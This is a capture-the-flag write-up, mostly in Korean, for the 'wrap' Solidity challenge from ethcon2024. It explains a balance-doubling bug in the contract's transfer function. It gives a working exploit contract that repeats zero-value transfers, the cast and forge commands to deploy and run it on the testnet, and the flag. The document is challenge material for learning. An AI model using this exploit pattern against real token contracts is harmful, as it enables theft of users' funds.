# Intermediate: 1. wrap



**Mission**

Ethereum smart contracts require utmost caution because even the smallest mistake can lead to significant issues! Identify and exploit the vulnerability - [contract](https://sepolia.scrollscan.com/address/0x8aA661B83B69f3bc68A593fc9d7a73CAc6716753)

```solidity
pragma solidity =0.8.27;

contract Wrap {
    uint256 public decimals = 18;
    string public symbol = "wrap";
    address private _owner;
    mapping(address user => bool hasFlag) public flag;
    mapping(address user => uint256 balance) private _balances;

    function wrap() external payable {
        _balances[msg.sender] += msg.value;
    }

    function unwrap(uint256 amount) external {
        require(_balances[msg.sender] >= amount, "too big to unwrap");
        _balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }

    function transfer(address recipient, uint256 amount) external {
        require(recipient != address(0), "transfer to zero address");
        uint256 senderBalance = _balances[msg.sender];
        uint256 recipientBalance = _balances[recipient];
        require(senderBalance >= amount, "transfer amount exceeds balance");
        _balances[msg.sender] = senderBalance - amount;
        _balances[recipient] += recipientBalance + amount;
    }

    function buyFlag() external {
        require(flag[msg.sender] == false, "already bought a flag");
        require(_balances[msg.sender] >= 1 ether, "not enough balance");
        _balances[msg.sender] -= 1 ether;
        flag[msg.sender] = true;
    }
}
```

buyFlag의 조건을 보면, balance가 1 ether 이상이어야 문제를 해결할 수 있다. 그러나 faucet이 1 ether 이상 주지 않는다. 

취약점은 transfer 함수에서 발생한다. parameter로 받은 recipient한테, amount만큼 돈을 주는 것을 의도하고 만들었으나, 수식에 오류가 있다.

```solidity
_balances[msg.sender] = senderBalance - amount;
_balances[recipient] += recipientBalance + amount;
```

위 식에서 recipient의 잔액을 올리는 부분을 보자. recipientBalance가 0보다 크다면, recipient의 잔액이 계속 증가하게 된다. 즉 아래와 같이 작성해야 한다.

```solidity
_balances[recipient] += amount;
```

이러한 수식상의 실수로 문제가 발생하는데, 만약 recipientBalance가 0.001 ether이고 amount가 0이라 해보자. msg.sender의 balance는 줄어들지 않게 되고, recipient의 잔액은 실질적으로 아래와 같은 수식이 된다.

```solidity
_balances[recipient] += recipientBalance;
```

만약 공격자가 transfer를 반복적으로 호출한다면, recipient의 balance는 아래와 같이 지수적으로 상승할 것이다.

```solidity
0.001 + 0.001 = 0.002

0.002 + 0.002 = 0.004

0.004 + 0.004 = 0.008
.
.
.
```

이를 이용해 우리는 0.001 ether를 1 ether 이상으로 만들 수 있게 된다.

먼저 본인의 지갑 주소로, wrap 함수를 호출하면서 0.001 ether을 deposit 하자.

```solidity
 cast send 0x8aA661B83B69f3bc68A593fc9d7a73CAc6716753 "wrap()" --value 0.001ether --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

그 후, 공격 코드는 아래와 같이 작성한다.

```solidity
pragma solidity =0.8.27;

interface iWrap{
	function balanceOf(address) external view returns (uint256);
	function transfer(address, uint256) external;
}

contract Solve {
	function exploit(address _target) external {

		iWrap target = iWrap(_target);

		while(target.balanceOf(tx.origin)<1 ether){
			target.transfer(tx.origin, 0);
		}
	}
}
```

본인의 잔액이 1 ether 이상이 될 때 까지 반복적으로 transfer를 호출하여 공격을 수행한다.

deploy:

```solidity
forge create Solve --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY   
```

call exploit:

```solidity
cast send 0x439Ae1C7bA0937f4A51E97172102600A216bE6e6 "exploit(address)" 0x8aA661B83B69f3bc68A593fc9d7a73CAc6716753 --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY 
```

공격에 성공하면, buyFlag를 호출해 flag를 얻는다.

call buyFlag:

```solidity
cast send 0x8aA661B83B69f3bc68A593fc9d7a73CAc6716753 "buyFlag()" --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY  
```

Flag

```solidity
ethcon2024{Lesson number one: All code can have vulnerabilities. So be cautious.}
```